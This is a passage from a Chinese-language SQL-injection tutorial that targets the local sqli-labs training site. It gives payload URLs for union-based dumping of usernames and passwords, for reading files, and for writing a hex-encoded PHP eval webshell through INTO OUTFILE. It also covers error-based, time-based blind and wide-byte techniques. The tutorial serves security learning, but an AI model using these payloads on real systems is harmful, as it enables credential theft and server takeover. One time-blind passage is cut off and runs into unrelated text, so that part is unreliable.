    ​
    #获取当前数据库中指定表的指定字段的值(只能是database()所在的数据库内的数据，因为处于当前数据库下的话不能查询其他数据库内的数据)
    http://127.0.0.1/sqli/Less-1/?id=-1'  union select 1,group_concat(password),3 from users%23
当我们已知当前数据库名security，我们就可以通过下面的语句得到当前数据库的所有的表
    http://127.0.0.1/sqli/Less-1/?id=-1'  union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' #
我们知道了当前数据库中存在了四个表，那么我们可以通过下面的语句知道每一个表中的列
    http://127.0.0.1/sqli/Less-1/?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users' #
如下，我们可以知道users表中有id，username，password三列
我们知道存在users表，又知道表中有 id ，username， password三列，那么我们可以构造如下语句
    http://127.0.0.1/sqli/Less-1/?id=-1'  union select 1,group_concat(id,'--',username,'--',password),3 from users #
我们就把users表中的所有数据都给爆出来了
### 三：文件读写
**·** 当有显示列的时候，文件读可以利用 union 注入。
**·** 当没有显示列的时候，只能利用盲注进行数据读取。
示例：读取e盘下3.txt文件
union注入读取文件(load_file)
    //union注入读取 e:/3.txt 文件
    http://127.0.0.1/sqli/Less-1/?id=-1'   union select 1,2,load_file("e:/3.txt")#
    ​
    //也可以把 e:/3.txt 转换成16进制 0x653a2f332e747874
    http://127.0.0.1/sqli/Less-1/?id=-1'   union select 1,2,load_file(0x653a2f332e747874)#
盲注读取文件
    //盲注读取的话就是利用hex函数，将读取的字符串转换成16进制，再利用ascii函数，转换成ascii码，再利用二分法一个一个的判断字符，很复杂，一般结合工具完成
    http://127.0.0.1/sqli/Less-1/?id=-1' and ascii(mid((select hex(load_file('e:/3.txt'))),18,1))>49#' LIMIT 0,1
我们可以利用写入文件的功能，在e盘创建4.php文件，然后写入一句话木马
union写入文件(into outfile)
    //利用union注入写入一句话木马  into outfile 和 into dumpfile 都可以
    http://127.0.0.1/sqli/Less-1/?id=-1'  union select 1,2,''  into outfile  'e:/4.php' #
    ​
    // 可以将一句话木马转换成16进制的形式
    http://127.0.0.1/sqli/Less-1/?id=-1'  union select 1,2,0x3c3f70687020406576616c28245f504f53545b6161615d293b3f3e  into outfile  'e:/4.php' #
### 四：报错注入
**利用前提** : 页面上没有显示位，但是需要输出 SQL 语句执行错误信息。比如 mysql_error()
**优点** : 不需要显示位
**缺点** : 需要输出 mysql_error( )的报错信息
**floor报错注入**
floor报错注入是利用 **count()函数 、rand()函数 、floor()函数 、group by**
这几个特定的函数结合在一起产生的注入漏洞。缺一不可
    // 我们可以将 user() 改成任何函数，以获取我们想要的信息。具体可以看文章开头关于information_schema数据库的部分
    http://127.0.0.1/sqli/Less-1/?id=-1'  and (select 1 from (select count(*) from information_schema.tables group by concat(user(),floor(rand(0)*2)))a) #
    ​
    //将其分解
    (select 1 from (Y)a)
    ​
    Y= select count(*) from information_schema.tables group by concat(Z)
    ​
    Z= user(),floor(rand(0)*2)           //将这里的 user() 替换成我们需要查询的函数
floor报错注入参考：
ExtractValue报错注入
> > EXTRACTVALUE (XML_document, XPath_string)
**·** 第一个参数：XML_document 是 String 格式，为 XML 文档对象的名称
**·** 第二个参数：XPath_string (Xpath 格式的字符串).
作用：从目标 XML 中返回包含所查询值的字符串
ps: 返回结果 限制在32位字符
    // 可以将 user() 改成任何我们想要查询的函数和sql语句 ,0x7e表示的是 ~
    http://127.0.0.1/sqli/Less-1/?id=-1'  and extractvalue(1,concat(0x7e,user(),0x7e))#
    ​
    // 通过这条语句可以得到所有的数据库名，更多的关于informaion_schema的使用看文章头部
    http://127.0.0.1/sqli/Less-1/?id=-1'  and extractvalue(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e))#
###
**UpdateXml报错注入**
UpdateXml
函数实际上是去更新了XML文档，但是我们在XML文档路径的位置里面写入了子查询，我们输入特殊字符，然后就因为不符合输入规则然后报错了，但是报错的时候他其实已经执行了那个子查询代码！
> > UPDATEXML (XML_document, XPath_string, new_value)
**·** 第一个参数：XML_document 是 String 格式，为 XML 文档对象的名称，文中为 Doc 1
**·** 第二个参数：XPath_string (Xpath 格式的字符串) ，如果不了解 Xpath 语法，可以在网上查找教程。
**·** 第三个参数：new_value，String 格式，替换查找到的符合条件的数据
作用：改变文档中符合条件的节点的值
    // 可以将 user() 改成任何我们想要查询的函数和sql语句 ,0x7e表示的是 ~
    http://127.0.0.1/sqli/Less-1/?id=-1'  and updatexml(1,concat(0x7e,user(),0x7e),1)#
    ​
    // 通过这条语句可以得到所有的数据库名，更多的关于informaion_schema的使用看文章头部
    http://127.0.0.1/sqli/Less-1/?id=-1'  and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e),1)#
更多的关于报错注入的文章：
### 五：时间盲注
Timing Attack注入，也就是时间盲注。通过简单的条件语句比如 and 1=2 是无法看出异常的。
在MySQL中，有一个Benchmark() 函数，它是用于测试性能的。 Benchmark(count,expr) ，这个函数执行的结果，是将表达式
expr 执行 count 次 。
因此，利用benchmark函数，可以让同一个函数执行若干次，使得结果返回的时间比平时要长，通过时间长短的变化，可以判断注入语句是否执行成功。这是一种边信道攻击，这个技巧在盲注中被称为Timing
Attack，也就是时间盲注。
MySQL | benchmark(100000000,md5(1))sleep(3)  
---|---  
PostgreSQL | PG_sleep(5)Generate_series(1,1000000)  
SQLServer | waitfor delay ‘0:0:5’  
**利用前提** ：页面上没有显示位，也没有输出 SQL 语句执行错误信息。正确的 SQL 语句和错误的 SQL 语句返回页面都一样，但是加入
sleep(5)条件之后，页面的返回速度明显慢了 5 秒。
**优点** ：不需要显示位，不需要出错信息。
**缺点** ：速度慢，耗费大量时间
sleep 函数判断页面响应时间 if(判断条件，为true时执行，为false时执行)
我们可以构造下面的语句，判断条件是否成立。然后不断变换函数直到获取到我们想要的信息
    //判断是否存在延时注入
    http://127.0.0.1/sqli/Less-1/?id=1' and sleep(5)#
    ​
    // 判断数据库的第一个字符的ascii值是否大于100，如果大于100，页面立即响应，如果不大于，页面延时5秒响应
    http://127.0.0.1/sqli/Less-1/?id=1' and if(ascii(substring(database(),1,1)) ^a ;
判断出了第一个表的第一个字符，接着判断第一个表的第二个字符 ^a[a-z] –> ^ad ; 就这样，一步一步判断第一个表的表名 ^admin$ 。然后
limit 1，1 判断第二个表
    // 判断security数据库下的第一个表的是否以a-z的字母开头
    http://127.0.0.1/sqli/Less-1/?id=1' and  1=(select 1 from information_schema.tables where table_schema='security' and table_name regexp '^[a-z]' limit 0,1) #
参考文档：
### 七：宽字节注入
宽字节注入是由于不同编码中中英文所占字符的不同所导致的。通常来说，在GBK编码当中，一个汉字占用2个字节。而在UTF-8编码中，一个汉字占用3个字节。在php中，我们可以通过输入
echo strlen(“中”)
来测试，当为GBK编码时，输入2，而为UTF-8编码时，输出3。除了GBK以外，所有的ANSI编码都是中文都是占用两个字节。
相关文章：[字符集与字符编码](https://blog.csdn.net/qq_36119192/article/details/84138312)
在说之前，我们先说一下php中对于sql注入的过滤，这里就不得不提到几个函数了。
**addslashes()** ：这个函数在预定义字符之前添加反斜杠 \ 。预定义字符： 单引号 ‘ 、双引号 ” 、反斜杠 \
、NULL。但是这个函数有一个特点就是虽然会添加反斜杠 \ 进行转义，但是 \
并不会插入到数据库中。这个函数的功能和魔术引号完全相同，所以当打开了魔术引号时，不应使用这个函数。可以使用 get_magic_quotes_gpc()
来检测是否已经转义。
**mysql_real_escape_string()** ：这个函数用来转义sql语句中的特殊符号x00 、\n 、\r 、\ 、‘ 、“ 、x1a。
**魔术引号** ：当打开时，所有的单引号’ 、双引号” 、反斜杠\ 和 NULL 字符都会被自动加上一个反斜线来进行转义，这个和 addslashes()
函数的作用完全相同。所以，如果魔术引号打开了，就不要使用 addslashes() 函数了。一共有三个魔术引号指令。
**·** magic_quotes_gpc 影响到 HTTP 请求数据（GET，POST 和 COOKIE）。不能在运行时改变。在 PHP 中默认值为
on。 参见 get_magic_quotes_gpc()。如果 magic_quotes_gpc 关闭时返回 0，开启时返回 1。在 PHP 5.4.0
起将始终返回 0，因为这个魔术引号功能已经从 PHP 中移除了。
**·** magic_quotes_runtime
如果打开的话，大部份从外部来源取得数据并返回的函数，包括从数据库和文本文件，所返回的数据都会被反斜线转义。该选项可在运行的时改变，在 PHP 中的默认值为
off。 参见 set_magic_quotes_runtime() 和 get_magic_quotes_runtime()。
**·** magic_quotes_sybase (魔术引号开关)如果打开的话，将会使用单引号对单引号进行转义而非反斜线。此选项会完全覆盖
magic_quotes_gpc。如果同时打开两个选项的话，单引号将会被转义成 ”。而双引号、反斜线 和 NULL 字符将不会进行转义。
可以在 php.ini 中看这几个参数是否开启
我们这里搭了一个平台来测试，这里得感谢其他大佬的源码。